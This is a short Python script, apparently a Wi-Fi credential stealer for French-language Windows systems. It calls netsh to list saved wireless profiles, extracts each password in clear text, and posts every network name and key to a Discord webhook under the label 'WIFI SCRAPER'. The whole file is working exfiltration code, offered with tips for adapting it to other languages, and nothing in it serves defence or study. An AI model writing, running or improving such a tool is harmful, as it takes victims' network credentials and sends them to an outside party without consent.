#this code only work on french window system if you want to try it on a english 
# or other languages people you will have to change the line 55 and 66 
# by the english word without touching at the space


import subprocess
import requests


WEBHOOK = "x"

def get_wifi():
    global result,output,lines
    result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], stdout=subprocess.PIPE)
    output = result.stdout.decode(errors='replace')
    lines = output.split('\n')

def get_key(parts):
    global lines,output,result,profile_name
    
    profile_name = f'"{parts[1].strip()}"'
    result = subprocess.run(['netsh', 'wlan', 'show', 'profiles', profile_name, 'key=clear'], stdout=subprocess.PIPE)
    output = result.stdout.decode(errors='replace')
    lines = output.split('\n')  


def get_embed(parts,parts_):
    message = {
        "username": "WIFI SCRAPER・BKS#1958",
        "avatar_url": "https://cdn.discordapp.com/attachments/1017497867092504627/1058127051388899368/ARepqpjdpWHTAAAAAElFTkSuQmCC.png",
        "embeds": [
                {
                "title": ":globe_with_meridians: - Wifi Key Scrap",
                "color": 7637972 ,
                "fields": [
                    {
                        "name": ":open_file_folder: Domain Name \n",
                        "value":  f"\n ||**{parts[1]}**||"
                    },
                    {
                        "name": ":shield: Key found ",
                        "value":  f"\n ||**{parts_[1]}**||"
                    }

                ]}]}
    response = requests.post(WEBHOOK, json=message)
    
def get_specific(line):
    global string
    
    string = line.strip()

def main():
    
    get_wifi()
    
    for line in lines:
        if line.startswith('    Profil Tous les utilisateurs'):
            get_specific(line)
            parts = string.split(':')
            if len(parts) != 2:
                pass
            else:   
                get_key(parts)
                for line in lines:  
                    if line.startswith('    Contenu'):
                        get_specific(line)
                        parts_ = string.split(':')
                        if len(parts_) != 2:
                            pass
                        else:
                            get_embed(parts,parts_)



main()
